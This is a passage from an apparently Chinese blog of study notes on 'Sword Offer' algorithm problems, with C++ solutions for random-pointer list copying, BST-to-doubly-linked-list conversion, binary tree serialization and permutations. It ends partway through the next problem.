hash表法(推荐)</h3><p>问题难点在于random的处理：若搜到有random时就new一个对应节点，则后续节点的next对应到这个节点时不好处理，因此可以用hash表，使得：</p><p>当节点1的random和节点2的next对应节点相同时(key相同)时，新链表中对应的节点1’的random和节点2’的next对应的节点也能相同(value相同)</p><blockquote><p>hash的是<code>node</code> 和 <code>node-&gt;random</code></p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list with a random pointer.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next, *random;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL), random(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">ListNode *<span class="title">copyRandomList</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">    unordered_map&lt;ListNode*, ListNode*&gt; hash;</span><br><span class="line">    hash[<span class="literal">nullptr</span>] = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">auto</span> dummy = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">-1</span>), cur = dummy;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (head) &#123;</span><br><span class="line">      <span class="comment">// hash的是 head 和 head-&gt;random</span></span><br><span class="line">      <span class="keyword">if</span> (!hash.<span class="built_in">count</span>(head)) hash[head] = <span class="keyword">new</span> <span class="built_in">ListNode</span>(head-&gt;val);</span><br><span class="line">      <span class="keyword">if</span> (!hash.<span class="built_in">count</span>(head-&gt;random)) hash[head-&gt;random] = <span class="keyword">new</span> <span class="built_in">ListNode</span>(head-&gt;random-&gt;val);</span><br><span class="line">      </span><br><span class="line">      cur-&gt;next = hash[head];</span><br><span class="line">      cur-&gt;next-&gt;random = hash[head-&gt;random];</span><br><span class="line">      </span><br><span class="line">      head = head-&gt;next;</span><br><span class="line">      cur = cur-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dummy-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="法2-并行链表">法2 并行链表</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode *<span class="title">copyRandomList</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 1. 链表所有节点中间都插入一个复制节点，作为并行链表</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> p = head; p; ) &#123;</span><br><span class="line">            ListNode* np = <span class="keyword">new</span> <span class="built_in">ListNode</span>(p-&gt;val);</span><br><span class="line">            np-&gt;next = p-&gt;next;</span><br><span class="line">            p-&gt;next = np;</span><br><span class="line">            p = np-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 遍历新链表，遇到Random节点后对应改变并行链表中的节点</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> p = head; p; p = p-&gt;next-&gt;next) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p-&gt;random) &#123;</span><br><span class="line">                p-&gt;next-&gt;random = p-&gt;random-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 提取出并行链表</span></span><br><span class="line">        <span class="comment">// 注意这里要实现的链表的复刻：原链表应恢复为原来的结构(前面已经修改了原链表的结构)</span></span><br><span class="line">        <span class="comment">// p指向原链表的节点, cur指向并行链表的节点</span></span><br><span class="line">        <span class="keyword">auto</span> dummy = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">-1</span>), cur = dummy;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> p = head; p; p = p-&gt;next) &#123;</span><br><span class="line">            cur-&gt;next = p-&gt;next;</span><br><span class="line">            cur = cur-&gt;next;</span><br><span class="line">            p-&gt;next = p-&gt;next-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="二叉搜索树与双向链表★"><a href="https://www.acwing.com/problem/content/87/">二叉搜索树与双向链表★</a></h2><p>输入一棵二叉搜索树，将该二叉搜索树转换成一个排序的双向链表。</p><p>要求不能创建任何新的结点，只能调整树中结点指针的指向。</p><p><strong>注意</strong>：</p><ul><li>需要返回双向链表最左侧的节点。</li></ul><p>例如，输入下图中左边的二叉搜索树，则输出右边的排序双向链表。</p><p><img src="/2022/11/16/%E7%AE%97%E6%B3%95-%E3%80%8A%E5%89%91%E6%8C%87offer%E3%80%8B%E7%AC%94%E8%AE%B0/image-20221218114850074.png" alt></p><p><strong>数据范围</strong></p><p>树中节点数量 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>500</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,500]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">500</span><span class="mclose">]</span></span></span></span>。</p><h3 id="法1-修改的中序优先遍历">法1 修改的中序优先遍历</h3><p>就在中序递归遍历的基础上改了一点点，用一个pre指针保存中序遍历的前一个结点。<br>因为是中序遍历，遍历顺序就是双线链表的建立顺序；<br>每一个结点访问时它的左子树肯定被访问过了，所以放心大胆的改它的left指针，不怕树断掉；<br>同理，pre指向的结点保存的数肯定小于当前结点，所以其左右子树肯定都访问过了，所以其right指针也可以直接改。</p><p>最后需要一直向左找到双向链表的头结点。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  TreeNode* prev = <span class="literal">nullptr</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="function">TreeNode* <span class="title">convert</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">dfs</span>(root);</span><br><span class="line">    <span class="keyword">while</span> (root &amp;&amp; root-&gt;left) root = root-&gt;left;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(TreeNode *root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">dfs</span>(root-&gt;left);</span><br><span class="line">    </span><br><span class="line">    root-&gt;left = prev;</span><br><span class="line">    <span class="keyword">if</span> (prev) prev-&gt;right = root;</span><br><span class="line">    prev = root;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">dfs</span>(root-&gt;right);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="法2-递归法-2">法2 递归法</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">TreeNode* <span class="title">convert</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">auto</span> sides = <span class="built_in">dfs</span>(root);</span><br><span class="line">    <span class="keyword">return</span> sides.first;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">pair&lt;TreeNode*, TreeNode*&gt; <span class="title">dfs</span><span class="params">(TreeNode *root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root-&gt;left &amp;&amp; !root-&gt;right) <span class="keyword">return</span> &#123;root, root&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (root-&gt;left &amp;&amp; root-&gt;right) &#123;</span><br><span class="line">      <span class="keyword">auto</span> lsides = <span class="built_in">dfs</span>(root-&gt;left), rsides = <span class="built_in">dfs</span>(root-&gt;right);</span><br><span class="line">      lsides.second-&gt;right = root, root-&gt;left = lsides.second;</span><br><span class="line">      rsides.first-&gt;left = root, root-&gt;right = rsides.first;</span><br><span class="line">      <span class="keyword">return</span> &#123;lsides.first, rsides.second&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (root-&gt;left) &#123;</span><br><span class="line">      <span class="keyword">auto</span> lsides = <span class="built_in">dfs</span>(root-&gt;left);</span><br><span class="line">      lsides.second-&gt;right = root, root-&gt;left = lsides.second;</span><br><span class="line">      <span class="keyword">return</span> &#123;lsides.first, root&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (root-&gt;right) &#123;</span><br><span class="line">      <span class="keyword">auto</span> rsides = <span class="built_in">dfs</span>(root-&gt;right);</span><br><span class="line">      rsides.first-&gt;left = root, root-&gt;right = rsides.first;</span><br><span class="line">      <span class="keyword">return</span> &#123;root, rsides.second&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="序列化二叉树★★"><a href="https://www.acwing.com/problem/content/46/">序列化二叉树★★</a></h2><p>请实现两个函数，分别用来序列化和反序列化二叉树。</p><p>您需要确保二叉树可以序列化为字符串，并且可以将此字符串反序列化为原始树结构。</p><p><strong>数据范围</strong></p><p>树中节点数量 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1000</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>你可以序列化如下的二叉树    8   / \  12  2     / \    6   4为：&quot;[8, 12, 2, null, null, 6, 4, null, null, null, null]&quot;</code></pre><p><strong>注意</strong>:</p><ul><li>以上的格式是AcWing序列化二叉树的方式，你不必一定按照此格式，所以可以设计出一些新的构造方式。</li></ul><h3 id="题解-4">题解</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Encodes a tree to a single string.</span></span><br><span class="line">  <span class="function">string <span class="title">serialize</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">    string res;</span><br><span class="line">    <span class="built_in">dfs_s</span>(root, res);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">dfs_s</span><span class="params">(TreeNode *root, string &amp;s)</span> </span>&#123;  <span class="comment">// 必须加引用</span></span><br><span class="line">    <span class="keyword">if</span> (!root) &#123;</span><br><span class="line">      s += <span class="string">&quot;null &quot;</span>;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    s += <span class="built_in">to_string</span>(root-&gt;val) + <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    <span class="built_in">dfs_s</span>(root-&gt;left, s);</span><br><span class="line">    <span class="built_in">dfs_s</span>(root-&gt;right, s);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Decodes your encoded data to tree.</span></span><br><span class="line">  <span class="function">TreeNode* <span class="title">deserialize</span><span class="params">(string data)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> u = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">auto</span> root = <span class="built_in">dfs_d</span>(data, u);</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function">TreeNode *<span class="title">dfs_d</span><span class="params">(string &amp;data, <span class="type">int</span> &amp;u)</span> </span>&#123;  <span class="comment">// 必须加引用</span></span><br><span class="line">    <span class="keyword">if</span> (u == data.<span class="built_in">size</span>()) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> k = u;</span><br><span class="line">    <span class="keyword">while</span> (data[k] != <span class="string">&#x27; &#x27;</span>) k++;  <span class="comment">// 只能用单引号</span></span><br><span class="line">    <span class="keyword">if</span> (data[u] == <span class="string">&#x27;n&#x27;</span>) &#123;</span><br><span class="line">      u = k + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> num = <span class="number">0</span>, sign = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (data[u] == <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">      sign = <span class="number">-1</span>;</span><br><span class="line">      u++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = u; i &lt; k; i++)</span><br><span class="line">      num = <span class="number">10</span> * num + data[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    num = sign * num;</span><br><span class="line">    u = k + <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">auto</span> root = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(num);</span><br><span class="line">    root-&gt;left = <span class="built_in">dfs_d</span>(data, u);  <span class="comment">// 只有u是引用，不能传局部变量k + 1</span></span><br><span class="line">    root-&gt;right = <span class="built_in">dfs_d</span>(data, u);</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>若不使用单引号，报错信息如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Line <span class="number">40</span>: Char <span class="number">20</span>: warning: <span class="function">result of comparison against a string literal is <span class="title">unspecified</span> <span class="params">(use an <span class="keyword">explicit</span> string comparison function instead)</span> [-Wstring-compare]</span></span><br><span class="line"><span class="function">    <span class="title">while</span> <span class="params">(data[k] != <span class="string">&quot; &quot;</span>)</span> k++</span>;</span><br><span class="line">                   ^  ~~~</span><br><span class="line">Line <span class="number">40</span>: Char <span class="number">20</span>: error: <span class="function">comparison between pointer <span class="keyword">and</span> <span class="title">integer</span> <span class="params">(<span class="string">&#x27;__gnu_cxx::__alloc_traits&lt;std::allocator&lt;char&gt;, char&gt;::value_type&#x27;</span> (aka <span class="string">&#x27;char&#x27;</span>) <span class="keyword">and</span> <span class="string">&#x27;const char *&#x27;</span>)</span></span></span><br><span class="line"><span class="function">    <span class="title">while</span> <span class="params">(data[k] != <span class="string">&quot; &quot;</span>)</span> k++</span>;</span><br><span class="line">           ~~~~~~~ ^  ~~~</span><br><span class="line"><span class="number">1</span> warning <span class="keyword">and</span> <span class="number">1</span> error generated.</span><br></pre></td></tr></table></figure></blockquote><h2 id="数字排列★"><a href="https://www.acwing.com/problem/content/47/">数字排列★</a></h2><p>输入一组数字（可能包含重复数字），输出其所有的排列方式。</p><p><strong>数据范围</strong></p><p>输入数组长度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>6</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,6]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">6</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>输入：[1,2,3]输出：      [        [1,2,3],        [1,3,2],        [2,1,3],        [2,3,1],        [3,1,2],        [3,2,1]      ]</code></pre><h3 id="dfs暴搜">dfs暴搜</h3><blockquote><p>其实更推荐后面一题的写法。</p></blockquote><p>思路是暴搜, 但是需要处理重复元素</p><ol><li>将所有数排序, 这样相同的数会排在一起</li><li>从小到大枚举每个数, 每次将它放在一个空位上</li><li>对于相同数, 其选择空位的起始位置start并不等于0, 而是必须在前一个数位置后面</li><li>注意回溯, 但dfs使用state进行传值时不用手动处理</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res_;</span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; path_;</span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; nums_;</span><br><span class="line">  </span><br><span class="line">  vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">permutation</span>(vector&lt;<span class="type">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">    nums_ = nums;</span><br><span class="line">    path_.<span class="built_in">resize</span>(nums_.<span class="built_in">size</span>());</span><br><span class="line">    <span class="built_in">sort</span>(nums_.<span class="built_in">begin</span>(), nums_.<span class="built_in">end</span>());</span><br><span class="line">    <span class="built_in">dfs</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> res_;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// u为枚举nums的下标, start为nums[u]可选起始位置(是否为重复元素会有影响), state记录path空位情况</span></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> u, <span class="type">int</span> start, <span class="type">int</span> state)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (u == nums_.<span class="built_in">size</span>()) &#123;</span><br><span class="line">      res_.<span class="built_in">push_back</span>(path_);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!u || nums_[u] != nums_[u - <span class="number">1</span>]) start = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = start; i &lt; nums_.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!(state &gt;&gt; i &amp; <span class="number">1</span>)) &#123;  <span class="comment">// &amp;, 而非&amp;&amp;</span></span><br><span class="line">        path_[i] = nums_[u];</span><br><span class="line">        <span class="built_in">dfs</span>(u + <span class="number">1</span>, i + <span class="number">1</span>, state + (<span class="number">1</span> &lt;&lt; i));  <span class="comment">// start传的是i + 1</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="字符串的排列"><a href="https://leetcode.cn/problems/zi-fu-chuan-de-pai-lie-lcof/">字符串的排列</a></h2><p>输入一个字符串，打印出该字符串中字符的所有排列。</p><p>你可以以任意顺序返回这个字符串数组，但里面不能有重复元素。</p><p><strong>示例:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;abc&quot;</span><br><span class="line">输出：[&quot;abc&quot;,&quot;acb&quot;,&quot;bac&quot;,&quot;bca&quot;,&quot;cab&quot;,&quot;cba&quot;]</span><br></pre></td></tr></table></figure><h3 id="回溯法">回溯法</h3><p>具体参考：<a href="https://leetcode.cn/problems/zi-fu-chuan-de-pai-lie-lcof/solution/mian-shi-ti-38-zi-fu-chuan-de-pai-lie-hui-su-fa-by/">剑指 Offer 38. 字符串的排列（回溯法，清晰图解）</a></p><p><img src="https://pic.leetcode-cn.com/1599403497-GATdFr-Picture2.png" alt="Picture2.png"></p><blockquote><p><strong>set</strong> 加入元素的函数为 <code>insert()</code></p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  vector&lt;string&gt; res_;</span><br><span class="line"></span><br><span class="line">  <span class="function">vector&lt;string&gt; <span class="title">permutation</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">dfs</span>(s, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> res_;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(string &amp;s, <span class="type">int</span> u)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (u == s.<span class="built_in">size</span>() - <span class="number">1</span>) &#123;</span><br><span class="line">      res_.<span class="built_in">push_back</span>(s);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    set&lt;<span class="type">int</span>&gt; st;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = u; i &lt; s.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (st.<span class="built_in">find</span>(s[i]) != st.<span class="built_in">end</span>()) <span class="keyword">continue</span>;</span><br><span class="line">      st.<span class="built_in">insert</span>(s[i]);</span><br><span class="line">      <span class="built_in">swap</span>(s[i], s[u]);</span><br><span class="line">      <span class="built_in">dfs</span>(s, u + <span class="number">1</span>);</span><br><span class="line">      <span class="built_in">swap</span>(s[i], s[u]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="数组中出现次数超过一半的数字★"><a href="https://www.acwing.com/problem/content/48/">数组中出现次数超过一半的数字★</a></h2><p>数组中有一个数字出现的次数超过数组长度的一半，请找出这个数字。</p><p>假设数组非空，并且一定存在满足条件的数字。</p><p><strong>思考题</strong>：</p><ul><li>假设要求只能使用 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" 